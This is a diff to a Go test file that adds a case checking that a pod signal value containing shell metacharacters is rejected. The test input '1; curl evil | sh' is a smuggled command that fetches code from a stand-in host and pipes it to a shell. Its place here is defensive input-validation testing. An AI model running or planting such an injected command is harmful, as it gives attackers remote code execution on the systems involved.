@@ -39,6 +39,13 @@ func Test_Prepare(t *testing.T) {
 			wantErr:              "Pod checkout-xyz1234 in namespace shop has hostPID enabled. This is not yet supported",
 		},
 		{
+			name:                 "should reject a signal containing shell metacharacters",
+			podSpecContainerName: "example",
+			podSpecHostPID:       false,
+			configSignal:         "1; curl evil | sh",
+			wantErr:              `Invalid signal "1; curl evil | sh". Expected a signal number (e.g. 15) or name (e.g. SIGTERM).`,
+		},
+		{
 			name:                 "should return state for all container",
 			podSpecContainerName: "example",
 			podSpecHostPID:       false,
